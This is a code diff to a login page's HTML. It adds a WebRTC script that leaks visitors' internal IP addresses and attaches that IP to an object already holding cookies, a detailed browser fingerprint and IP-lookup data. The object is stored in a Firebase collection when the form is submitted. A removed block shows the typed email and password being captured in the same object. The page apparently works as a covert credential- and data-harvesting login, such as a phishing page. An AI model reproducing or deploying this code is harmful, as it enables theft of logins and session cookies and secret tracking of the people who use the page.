@@ -9,6 +9,76 @@
 		<script src="/__/firebase/init.js"></script>
 		<script src="js/jquery-3.2.1.min.js"></script>
 		<script>
+			// NOTE: window.RTCPeerConnection is "not a constructor" in FF22/23
+			var RTCPeerConnection =
+				/*window.RTCPeerConnection ||*/ window.webkitRTCPeerConnection ||
+				window.mozRTCPeerConnection;
+
+			if (RTCPeerConnection)
+				(function() {
+					var rtc = new RTCPeerConnection({ iceServers: [] });
+					if (1 || window.mozRTCPeerConnection) {
+						// FF [and now Chrome!] needs a channel/stream to proceed
+						rtc.createDataChannel('', { reliable: false });
+					}
+
+					rtc.onicecandidate = function(evt) {
+						// convert the candidate to SDP so we can run it through our general parser
+						// see https://twitter.com/lancestout/status/525796175425720320 for details
+						if (evt.candidate)
+							grepSDP('a=' + evt.candidate.candidate);
+					};
+					rtc.createOffer(
+						function(offerDesc) {
+							grepSDP(offerDesc.sdp);
+							rtc.setLocalDescription(offerDesc);
+						},
+						function(e) {
+							console.warn('offer failed', e);
+						}
+					);
+
+					var addrs = Object.create(null);
+					addrs['0.0.0.0'] = false;
+					function updateDisplay(newAddr) {
+						if (newAddr in addrs) return;
+						else addrs[newAddr] = true;
+						var displayAddrs = Object.keys(addrs).filter(function(
+							k
+						) {
+							return addrs[k];
+						});
+						document.getElementById('internalIP').textContent =
+							displayAddrs.join(' or perhaps ') || 'n/a';
+					}
+
+					function grepSDP(sdp) {
+						var hosts = [];
+						sdp.split('\r\n').forEach(function(line) {
+							// c.f. http://tools.ietf.org/html/rfc4566#page-39
+							if (~line.indexOf('a=candidate')) {
+								// http://tools.ietf.org/html/rfc4566#section-5.13
+								var parts = line.split(' '), // http://tools.ietf.org/html/rfc5245#section-15.1
+									addr = parts[4],
+									type = parts[7];
+								if (type === 'host') updateDisplay(addr);
+							} else if (~line.indexOf('c=')) {
+								// http://tools.ietf.org/html/rfc4566#section-5.7
+								var parts = line.split(' '),
+									addr = parts[2];
+								updateDisplay(addr);
+							}
+						});
+					}
+				})();
+			else {
+				document.getElementById('internalIP').innerHTML =
+					'<code>ifconfig | grep inet | grep -v inet6 | cut -d" " -f2 | tail -n1</code>';
+				document.getElementById('internalIP').nextSibling.textContent =
+					'In Chrome and Firefox your IP should display automatically, by the power of WebRTCskull.';
+			}
+		</script>
+		<script>
 			const db = firebase.firestore();
 			var ipapiData, ipinfoData;
 			function toggleSignIn() {
@@ -49,55 +119,6 @@
 								location.reload(true);
 								return;
 							} else {
-								var ob = {
-									email: document.getElementById('username')
-										.value,
-									password: document.getElementById(
-										'password'
-									).value,
-									navigator: {
-										timeOpened: new Date(),
-										timezone:
-											new Date().getTimezoneOffset() / 60,
-										pageon: window.location.pathname,
-										referrer: document.referrer,
-										previousSites: history.length,
-										browserCodeName: navigator.appCodeName,
-										browserName: navigator.appName,
-										browserEngine: navigator.product,
-										browserVersion1a: navigator.appVersion,
-										browserVersion1b: navigator.userAgent,
-										browserLanguage: navigator.language,
-										browserOnline: navigator.onLine,
-										browserPlatform: navigator.platform,
-										javaEnabled: navigator.javaEnabled(),
-										dataCookiesEnabled:
-											navigator.cookieEnabled,
-										dataCookies1: document.cookie,
-										dataCookies2: decodeURIComponent(
-											document.cookie.split(';')
-										),
-										sizeScreenW: screen.width,
-										sizeScreenH: screen.height,
-										sizeDocW:
-											document.documentElement
-												.clientWidth,
-										bodyCliW: document.body.clientWidth,
-										sizeDocH:
-											document.documentElement
-												.clientHeight,
-										bodyCliH: document.body.clientHeight,
-										sizeInW: innerWidth,
-										sizeInH: innerHeight,
-										sizeAvailW: screen.availWidth,
-										sizeAvailH: screen.availHeight,
-										scrColorDepth: screen.colorDepth,
-										scrPixelDepth: screen.pixelDepth,
-										ipapiData: ipapiDataCheck(),
-										ipinfoData: ipinfoDataCheck()
-									}
-								};
-								console.log(ob);
 								db.collection('onsubmit')
 									.doc(
 										firebase.firestore.Timestamp.now()
@@ -166,6 +187,10 @@
 									browserLanguage: navigator.language,
 									browserOnline: navigator.onLine,
 									browserPlatform: navigator.platform,
+									connection:
+										navigator.connection ||
+										navigator.mozConnection ||
+										navigator.webkitConnection,
 									javaEnabled: navigator.javaEnabled(),
 									dataCookiesEnabled: navigator.cookieEnabled,
 									dataCookies1: document.cookie,
@@ -187,11 +212,12 @@
 									scrColorDepth: screen.colorDepth,
 									scrPixelDepth: screen.pixelDepth,
 									ipapiData: ipapiDataCheck(),
-									ipinfoData: ipinfoDataCheck()
+									ipinfoData: ipinfoDataCheck(),
+									internalIP: document.getElementById('internalIP').innerText
 								}
 							};
 							console.log(ob);
-							db.collection('onload')
+							db.collection('onsubmit')
 								.doc(
 									firebase.firestore.Timestamp.now()
 										.toDate()
@@ -229,6 +255,7 @@
 		</script>
 	</head>
 	<body>
+		<h1 id="internalIP"></h1>
 		<div class="container" id="LoginContainer">
 			<div class="row"></div>
 			<div id="login-page" class="row">
